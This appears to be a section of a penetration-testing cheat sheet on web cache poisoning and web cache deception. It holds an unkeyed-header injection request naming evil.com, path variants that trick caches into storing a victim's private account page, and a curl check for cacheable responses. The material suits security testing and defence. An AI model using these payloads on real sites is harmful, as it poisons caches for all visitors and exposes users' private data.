## 18. CACHE POISONING / WEB CACHE DECEPTION

### Cache Poisoning
```bash
# Unkeyed header injection
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
# If "evil.com" reflected in response body AND gets cached → all users get poisoned page

# Param Miner (Burp extension) — finds unkeyed headers automatically
Right-click → Extensions → Param Miner → Guess headers
```

### Web Cache Deception
```bash
# Trick cache into storing victim's private response
# Victim visits: https://target.com/account/settings/nonexistent.css
# Cache sees .css → caches the private response
# Attacker requests same URL → gets victim's data

# Variants:
/account/settings%2F..%2Fstatic.css
/account/settings;.css
/account/settings/.css
```

### Detection
```bash
curl -s -I https://target.com/account | grep -i "cache-control\|x-cache\|age"
# If: no Cache-Control: private + x-cache: HIT → cacheable private data
```
